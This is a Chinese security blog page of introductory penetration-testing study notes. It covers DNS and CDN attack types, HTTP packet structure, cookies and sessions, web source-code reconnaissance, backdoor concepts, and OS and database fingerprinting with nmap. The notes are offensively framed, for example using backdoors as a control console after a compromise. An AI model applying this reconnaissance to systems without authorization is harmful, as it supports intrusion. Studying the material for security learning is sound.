

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/BH.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Big Head">
  <meta name="keywords" content="">
  
    <meta name="description" content="一、前期知识与相关信息收集概念名词什么是域名？ 域名：是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识（有时也指地理位置）。  什么是二级域名多级域名？ 二级域名： 在国际顶级域名下的二级域名 国际顶级域名下二级域名： 二级域名一般是指域名注册人选择使用的网上名称。 ex: 一级域名：“yahoo.com” 二级域名：“www.yaho">
<meta property="og:type" content="article">
<meta property="og:title" content="Study Note">
<meta property="og:url" content="http://example.com/2022/04/23/Study%20Note/index.html">
<meta property="og:site_name" content="BigHead-Sec">
<meta property="og:description" content="一、前期知识与相关信息收集概念名词什么是域名？ 域名：是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识（有时也指地理位置）。  什么是二级域名多级域名？ 二级域名： 在国际顶级域名下的二级域名 国际顶级域名下二级域名： 二级域名一般是指域名注册人选择使用的网上名称。 ex: 一级域名：“yahoo.com” 二级域名：“www.yaho">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/1.png">
<meta property="og:image" content="http://example.com/img/2.png">
<meta property="og:image" content="http://example.com/img/3.png">
<meta property="og:image" content="http://example.com/img/4.png">
<meta property="og:image" content="http://example.com/img/5.png">
<meta property="og:image" content="http://example.com/img/6.png">
<meta property="og:image" content="http://example.com/img/7.png">
<meta property="og:image" content="http://example.com/img/8.png">
<meta property="og:image" content="http://example.com/img/9.png">
<meta property="og:image" content="http://example.com/img/10.png">
<meta property="og:image" content="http://example.com/img/11.png">
<meta property="og:image" content="http://example.com/img/12.png">
<meta property="og:image" content="http://example.com/img/13.png">
<meta property="og:image" content="http://example.com/img/14.png">
<meta property="og:image" content="http://example.com/img/15.png">
<meta property="og:image" content="http://example.com/img/16.png">
<meta property="og:image" content="http://example.com/img/17.png">
<meta property="og:image" content="http://example.com/img/18.png">
<meta property="og:image" content="http://example.com/img/19.png">
<meta property="og:image" content="http://example.com/img/20.png">
<meta property="og:image" content="http://example.com/img/21.png">
<meta property="og:image" content="http://example.com/img/22.png">
<meta property="og:image" content="http://example.com/img/23.png">
<meta property="og:image" content="http://example.com/img/24.png">
<meta property="og:image" content="http://example.com/img/25.png">
<meta property="og:image" content="http://example.com/img/26.png">
<meta property="article:published_time" content="2022-04-23T02:01:40.120Z">
<meta property="article:modified_time" content="2022-06-26T04:39:32.084Z">
<meta property="article:author" content="Big Head">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/img/1.png">
  
  
  
  <title>Study Note - BigHead-Sec</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Shallow</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Study Note"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-04-23 10:01" pubdate>
          2022年4月23日 上午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          93k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          774 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Study Note</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="一、前期知识与相关信息收集"><a href="#一、前期知识与相关信息收集" class="headerlink" title="一、前期知识与相关信息收集"></a>一、前期知识与相关信息收集</h1><h2 id="概念名词"><a href="#概念名词" class="headerlink" title="概念名词"></a>概念名词</h2><h3 id="什么是域名？"><a href="#什么是域名？" class="headerlink" title="什么是域名？"></a>什么是域名？</h3><ul>
<li>域名：是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识（有时也指地理位置）。</li>
</ul>
<h3 id="什么是二级域名多级域名？"><a href="#什么是二级域名多级域名？" class="headerlink" title="什么是二级域名多级域名？"></a>什么是二级域名多级域名？</h3><ul>
<li>二级域名：</li>
<li>在国际顶级域名下的二级域名</li>
<li>国际顶级域名下二级域名： 二级域名一般是指域名注册人选择使用的网上名称。</li>
<li>ex: 一级域名：“yahoo.com” 二级域名：“<a target="_blank" rel="noopener" href="http://www.yahoo.com”/">www.yahoo.com”</a> 二级域名：“bbs.yahoo,com”</li>
<li>国家顶级域名下的二级域名：在国家顶级域名之下的二级域名的表示注册人类别的功能的标志。</li>
</ul>
<h3 id="域名发现对于安全测试的意义"><a href="#域名发现对于安全测试的意义" class="headerlink" title="域名发现对于安全测试的意义"></a>域名发现对于安全测试的意义</h3><ul>
<li>可以给安全测试提供更多的测试点，方便获取更多相关信息</li>
</ul>
<h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><h4 id="什么是DNS？"><a href="#什么是DNS？" class="headerlink" title="什么是DNS？"></a>什么是DNS？</h4><ul>
<li>域名系统（Domain Name System）。是一个域名和IP地址相互映射的一个分布式数据库，可以让人们更方便地访问互联网。DNS使用UDP端口53。对于每一级域名长度的限制是63个字符，域名总长度不能超过253个字符。</li>
</ul>
<h4 id="本地HOSTS与DNS的关系？"><a href="#本地HOSTS与DNS的关系？" class="headerlink" title="本地HOSTS与DNS的关系？"></a>本地HOSTS与DNS的关系？</h4><ul>
<li>Hosts在本地将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当我们访问域名时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。</li>
<li>Hosts地址：Windows:C:\Windows\System32\drivers       Linux：\etc\hosts</li>
</ul>
<h4 id="CDN是什么？与DNS的关系？"><a href="#CDN是什么？与DNS的关系？" class="headerlink" title="CDN是什么？与DNS的关系？"></a>CDN是什么？与DNS的关系？</h4><ul>
<li>CDN：是构建在数据网络上的一种分布式的内容分发网。可以提高系统的响应速度，也可以一定程度的拦截&#x2F;f防御攻击。</li>
</ul>
<h4 id="常见的CDN安全攻击："><a href="#常见的CDN安全攻击：" class="headerlink" title="常见的CDN安全攻击："></a>常见的CDN安全攻击：</h4><ul>
<li>缓存投毒：通过利用虚假的Internet地址替换掉域名系统表中的地址造成破坏</li>
<li>DNS劫持（域名劫持）：指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查之外的请求放行，否则返回假的IP地址或者什么都不做让请求失去响应，效果就是对特定的网络不能访问或者访问的是假地址。</li>
<li>DNS DDOS攻击：通过控制大量僵尸网络利用真实DNS协议栈发起大量域名查询请求，利用工具软件伪造源IP发送海量DNS查询，发送海量DNS查询报文导致网络带宽耗尽而无法传送正常DNS查询请求。</li>
</ul>
<h3 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h3><h4 id="常见的脚本语言类型有哪些？"><a href="#常见的脚本语言类型有哪些？" class="headerlink" title="常见的脚本语言类型有哪些？"></a>常见的脚本语言类型有哪些？</h4><ul>
<li>asp php aspx jsp javaweb pl py cgi 等</li>
</ul>
<h4 id="不同脚本类型与安全漏洞的关系？"><a href="#不同脚本类型与安全漏洞的关系？" class="headerlink" title="不同脚本类型与安全漏洞的关系？"></a>不同脚本类型与安全漏洞的关系？</h4><ul>
<li>不同脚本可能爆发漏洞的可能性有所不同</li>
<li>不同脚本漏洞的存在点可能不同，因为不同语言的适用范围不同</li>
</ul>
<h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><h4 id="什么是后门？"><a href="#什么是后门？" class="headerlink" title="什么是后门？"></a>什么是后门？</h4><ul>
<li>通常指那些绕过安全性控制而获取对程序或系统访问权的程序方法。</li>
<li>在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。</li>
</ul>
<h4 id="后门在安全测试中的实际意义？"><a href="#后门在安全测试中的实际意义？" class="headerlink" title="后门在安全测试中的实际意义？"></a>后门在安全测试中的实际意义？</h4><ul>
<li>可以更方便的链接到主机</li>
<li>在获取到玩主机权限的时候，后门可以充当命令控制台的角色</li>
</ul>
<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="WEB的组成架构模型？"><a href="#WEB的组成架构模型？" class="headerlink" title="WEB的组成架构模型？"></a>WEB的组成架构模型？</h4><ul>
<li>网站源码：分脚本类型，分应用方向</li>
<li>操作系统：windows linux</li>
<li>中间件（搭建平台）：apache iis tomcat nginx 等</li>
<li>数据库：access mysql mssql oracle sybase db2 postsql 等</li>
</ul>
<h4 id="为什么以Web层面为主？"><a href="#为什么以Web层面为主？" class="headerlink" title="为什么以Web层面为主？"></a>为什么以Web层面为主？</h4><ul>
<li>web使用的比较广</li>
<li>web网站了漏洞相对较多</li>
<li>web 作为跳板深入到其他资源相对容易</li>
</ul>
<h3 id="WEB相关安全漏洞"><a href="#WEB相关安全漏洞" class="headerlink" title="WEB相关安全漏洞"></a>WEB相关安全漏洞</h3><ul>
<li>WEB 源码类对应漏洞：SQL 注入，上传，XSS，代码执行，变量覆盖，逻辑漏洞，反序列化等</li>
<li>WEB 中间件对应漏洞：未授权访问，变量覆盖…</li>
<li>WEB 数据库对应漏洞：弱口令，权限提升…</li>
<li>WEB 系统层对应漏洞：提权，远程代码执行</li>
<li>其他第三方对应漏洞</li>
<li>APP 或 PC 应用结合类</li>
</ul>
<h2 id="数据包扩展"><a href="#数据包扩展" class="headerlink" title="数据包扩展"></a>数据包扩展</h2><h3 id="https-amp-http"><a href="#https-amp-http" class="headerlink" title="https&amp;http"></a>https&amp;http</h3><ul>
<li>HTTPS协议需要到CA申请证书，一般免费证书很少，需要交费。</li>
<li>HTTP协议运行在TCP之上，所有传输的内容都是明文；HTTPS运行在SSL&#x2F;TLS之上，SSL&#x2F;TLS运行在TCP之上，所有传输的内容都经过加密的。</li>
<li>HTTP和HTTPS使用的是完全不同的连接方式，用的端口也不一样，前者是<strong>80</strong>，后者是<strong>443</strong>。</li>
<li>HTTPS可以有效的防止运营商劫持，解决了防劫持的一个大问题。</li>
</ul>
<h3 id="Request-请求数据包"><a href="#Request-请求数据包" class="headerlink" title="Request 请求数据包"></a>Request 请求数据包</h3><h4 id="Request-Headers"><a href="#Request-Headers" class="headerlink" title="Request Headers"></a>Request Headers</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/adduser</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8030<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>16<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>chrome-extension://fdmmgilgnpjigdojojpjoooidkmcomcm<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)<br>Chrome/66.0.3359.181 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br></code></pre></td></tr></table></figure>

<h4 id="Form-Data"><a href="#Form-Data" class="headerlink" title="Form Data"></a>Form Data</h4><ul>
<li>name&#x3D;name&amp;age&#x3D;11</li>
</ul>
<h4 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h4><ul>
<li>请求行由三个标记组成：请求方法、请求 URL 和 HTTP 版本，它们用空格分享。</li>
<li>例如：GET &#x2F;index.html HTTP&#x2F;1.1</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">HTTP 规划定义了 <span class="hljs-number">8</span> 种可能的请求方法：<br><span class="hljs-keyword">GET</span>：检索 URL 中标识资源的一个简单请求<br>HEAD：与 <span class="hljs-keyword">GET</span> 方法相同，服务器只返回状态行和头标，并不返回请求文档<br>POST：服务器接受被写入客户端输出流中的数据的请求<br>PUT：服务器保存请求数据作为指定 URL 新内容的请求<br><span class="hljs-keyword">DELETE</span>：服务器删除 URL 中命令的资源的请求<br><span class="hljs-keyword">OPTIONS</span>：关于服务器支持的请求方法信息的请求<br>TRACE：web 服务器反馈 Http 请求和其头标的请求<br><span class="hljs-keyword">CONNECT</span> ：已文档化，但当前未实现的一个方法，预留做隧道处理<br></code></pre></td></tr></table></figure>

<h4 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs awk">由关键字/值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。<br>HOST: 主机或域名地址<br>Accept：指浏览器或其他客户可以接爱的 MIME 文件格式。Servlet 可以根据它判断并返回适当的文件格<br>式。<br>User-Agent：是客户浏览器名称<br>Host：对应网址 URL 中的 Web 名称和端口号。<br>Accept-Langeuage：指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。<br>connection：用来告诉服务器是否可以维持固定的 HTTP 连接。http 是无连接的，HTTP/<span class="hljs-number">1.1</span> 使用 Keep-Alive<br>为默认值，这样，当浏览器需要多个文件时(比如一个 HTML 文件和相关的图形文件)，不需要每次都建立<br>连接<br>Cookie：浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型数据体，它可以记载<br>和服务器相关的用户信息，也可以用来实现会话功能。<br>Referer ： 表 明 产 生 请 求 的 网 页 URL 。 如 比 从 网 页 <span class="hljs-regexp">/icconcept/i</span>ndex.jsp 中 点 击 一 个 链 接 到 网 页<br><span class="hljs-regexp">/icwork/</span>search ， 在 向 服 务 器 发 送 的 GET<span class="hljs-regexp">/icwork/</span>search 中 的 请 求 中 ， Referer 是<br>http:<span class="hljs-regexp">//</span>hostname:<span class="hljs-number">8080</span><span class="hljs-regexp">/icconcept/i</span>ndex.jsp。这个属性可以用来跟踪 Web 请求是从什么网站来的。<br>Content-Type：用来表名 request 的内容类型。可以用 HttpServletRequest 的 getContentType()方法取得。<br>Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span>.<br>Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加<br>速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式。<br></code></pre></td></tr></table></figure>

<h4 id="空行"><a href="#空行" class="headerlink" title="空行"></a>空行</h4><ul>
<li>最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。</li>
</ul>
<h4 id="请求数据"><a href="#请求数据" class="headerlink" title="请求数据"></a>请求数据</h4><ul>
<li>使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。</li>
</ul>
<h3 id="Response-返回数据包"><a href="#Response-返回数据包" class="headerlink" title="Response 返回数据包"></a>Response 返回数据包</h3><h4 id="Response-返回数据包数据格式"><a href="#Response-返回数据包数据格式" class="headerlink" title="Response 返回数据包数据格式"></a>Response 返回数据包数据格式</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">一个响应由四个部分组成；状态行、响应头标、空行、响应数据。<br>1.状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔<br>2.响应头标：包含服务器类型、日期、长度、内容类型等<br>3.空行：响应头与响应体之间用空行隔开<br>4.响应数据：浏览器会将实体内容中的数据取出来，生成相应的页面<br></code></pre></td></tr></table></figure>

<h4 id="HTTP响应码"><a href="#HTTP响应码" class="headerlink" title="HTTP响应码"></a>HTTP响应码</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">1xx：信息，请求收到，继续处理<br>2xx：成功，行为被成功地接受、理解和采纳<br>3xx：重定向，为了完成请求，必须进一步执行的动作<br>4xx：客户端错误<br>5xx：服务器错<br></code></pre></td></tr></table></figure>



<h3 id="什么是cookie，和Session的区别又是什么"><a href="#什么是cookie，和Session的区别又是什么" class="headerlink" title="什么是cookie，和Session的区别又是什么"></a>什么是cookie，和Session的区别又是什么</h3><p>  Cookie 和 Session都是用来跟踪浏览器用户身份的会话方式，但是两者的应用场景不太一样。Cookie 一般用来保存用户信息 比如</p>
<p>  ①我们在 Cookie 中保存已经登录过得用户信息，下次访问网站的时候页面可以自动帮你填写登录的一些基本信息；</p>
<p>  ②一般的网站都会有保持登录也就是说下次你再访问网站的时候就不需要重新登录了，这是因为用户登录的时候我们可以存放了一个 Token 在 Cookie 中，下次登录的时候只需要根据 Token 值来查找用户即可(为了安全考虑，重新登录一般要将 Token 重写)；</p>
<p>  ③登录一次网站后访问网站其他页面不需要重新登录。Session 的主要作用就是通过服务端记录用户的状态。典型的场景是购物车，当你要添加商品到购物车的时候，系统不知道是哪个用户操作的，因为 HTTP 协议是无状态的。服务端给特定的用户创建特定的Session 之后就可以标识这个用户并且跟踪这个用户了。Cookie 数据保存在客户端(浏览器端)，Session 数据保存在服务器端。Cookie 存储在客户端中，而Session存储在服务器上，相对来说 Session 安全性更高。如果使用 Cookie的一些敏感信息不要写入 Cookie 中，最好能将 Cookie 信息加密然后使用到的时候再去服务器端解密。</p>
<h2 id="搭建安全拓展"><a href="#搭建安全拓展" class="headerlink" title="搭建安全拓展"></a>搭建安全拓展</h2><h3 id="网络搭建环境"><a href="#网络搭建环境" class="headerlink" title="网络搭建环境"></a>网络搭建环境</h3><ul>
<li>ASP、PHP、ASPX、JSP、PY、JAVAWEB 等环境</li>
</ul>
<h4 id="WEB-源码中敏感文件"><a href="#WEB-源码中敏感文件" class="headerlink" title="WEB 源码中敏感文件"></a>WEB 源码中敏感文件</h4><ul>
<li>后台路径，数据库配置文件，备份文件等</li>
</ul>
<h3 id="基于中间件的简要识别"><a href="#基于中间件的简要识别" class="headerlink" title="基于中间件的简要识别"></a>基于中间件的简要识别</h3><ul>
<li>在Response返回数据包中的<strong>Response Headers</strong>中根据<strong>X-Powered-By</strong>对中间件进行判断</li>
</ul>
<h3 id="后门注意事项"><a href="#后门注意事项" class="headerlink" title="后门注意事项"></a>后门注意事项</h3><ul>
<li>后门是否给予执行权限</li>
<li>后门是否给予操作目录或文件权限</li>
<li>后门是否给予其他用户权限</li>
</ul>
<h2 id="WEB-源码拓展"><a href="#WEB-源码拓展" class="headerlink" title="WEB 源码拓展"></a>WEB 源码拓展</h2><blockquote>
<p>WEB 源码在安全测试中是非常重要的信息来源，可以用来<strong>代码审计</strong>漏洞也可以用来做信息突破口，其中 WEB 源码有很多技术需要简明分析。</p>
</blockquote>
<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul>
<li>关于 WEB 源码目录结构</li>
<li>关于 WEB 源码脚本类型</li>
<li>关于 WEB 源码应用分类</li>
<li>关于 WEB 源码其他说明</li>
</ul>
<h3 id="信息敏感点"><a href="#信息敏感点" class="headerlink" title="信息敏感点"></a>信息敏感点</h3><ul>
<li>敏感目录结构：数据库配置文件，后台目录，模版目录，数据库目录等</li>
<li>web脚本类型：ASP、PHP、ASPX、JSP、JAVAWEB 等脚本类型源码</li>
<li>应用分类：社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</li>
<li>开源，未开源问题，框架非框架问题，关于 CMS 识别问题及后续等</li>
<li>关于源码获取的相关途径：搜索，咸鱼淘宝，第三方源码站</li>
</ul>
<blockquote>
<p>关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外），在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理（数据库备份，bak 文件等），未获取到的源码采用各种方法想办法获取。</p>
<p><img src="/img/1.png" srcset="/img/loading.gif" lazyload></p>
<p>style.css：这个文件可以用来生成md5值来查寻cms框架。可以通过网页刷新时加载的文件来搜索cms。</p>
</blockquote>
<h2 id="系统-amp-数据库"><a href="#系统-amp-数据库" class="headerlink" title="系统&amp;数据库"></a>系统&amp;数据库</h2><p><img src="/img/2.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="操作系统层面"><a href="#操作系统层面" class="headerlink" title="操作系统层面"></a>操作系统层面</h3><h4 id="识别操作系统常用方法"><a href="#识别操作系统常用方法" class="headerlink" title="识别操作系统常用方法"></a>识别操作系统常用方法</h4><ul>
<li>看字母大小写，windows对大小写不敏感，Linux敏感</li>
<li>看ping值 –ttl在64左右，linux –ttl在128左右windows</li>
<li>nmap -O ip</li>
</ul>
<h4 id="简要两者区别及识别意义"><a href="#简要两者区别及识别意义" class="headerlink" title="简要两者区别及识别意义"></a>简要两者区别及识别意义</h4><ul>
<li>可以帮助我们明确思路</li>
<li>可以筛选掉不符合系统的情况</li>
</ul>
<h4 id="操作系统层面漏洞类型对应意义"><a href="#操作系统层面漏洞类型对应意义" class="headerlink" title="操作系统层面漏洞类型对应意义"></a>操作系统层面漏洞类型对应意义</h4><ul>
<li>覆盖面广</li>
<li>获取的权限高</li>
<li>危害性大</li>
</ul>
<h3 id="数据库层面"><a href="#数据库层面" class="headerlink" title="数据库层面"></a>数据库层面</h3><h4 id="识别数据库常用方法"><a href="#识别数据库常用方法" class="headerlink" title="识别数据库常用方法"></a>识别数据库常用方法</h4><ul>
<li>nmap -O ip</li>
<li>nmap ip -p 端口，通过端口开放反推数据库</li>
</ul>
<h4 id="数据库类型区别及识别意义"><a href="#数据库类型区别及识别意义" class="headerlink" title="数据库类型区别及识别意义"></a>数据库类型区别及识别意义</h4><ul>
<li>数据库的漏洞和类型相性很强</li>
<li>不同数据库漏洞爆发点不太一样</li>
<li>能确定数据库类型、版本，会对渗透有很大帮助</li>
</ul>
<h4 id="数据库常见漏洞类型及攻击"><a href="#数据库常见漏洞类型及攻击" class="headerlink" title="数据库常见漏洞类型及攻击"></a>数据库常见漏洞类型及攻击</h4><ul>
<li>弱口令</li>
<li>sql注入</li>
</ul>
<h4 id="简要数据库层面漏洞影响范围"><a href="#简要数据库层面漏洞影响范围" class="headerlink" title="简要数据库层面漏洞影响范围"></a>简要数据库层面漏洞影响范围</h4><ul>
<li>要参考数据库的重要程来判定影响范围</li>
</ul>
<h4 id="常见的数据库结构"><a href="#常见的数据库结构" class="headerlink" title="常见的数据库结构"></a>常见的数据库结构</h4><ul>
<li>ASP+Access</li>
<li>php+mysql</li>
<li>axpx+mssql</li>
<li>jsp+mssql，oracle</li>
<li>python+mongodb</li>
</ul>
<h4 id="服务器端口"><a href="#服务器端口" class="headerlink" title="服务器端口"></a>服务器端口</h4><ul>
<li>关系型数据库 –MySQL:3306 –SqlServer:1433 –Oracle:1521</li>
<li>NOSQL数据库 –MongoDB:27017 –Redis:6379 –memcached:11211</li>
</ul>
<h4 id="第三方"><a href="#第三方" class="headerlink" title="第三方"></a>第三方</h4><ul>
<li>如何判断那些有第三方平台或软件 – 端口扫描 – 特征匹配</li>
<li>简要为什么要识别第三方平台或软件 – 可以提供额外的攻击面</li>
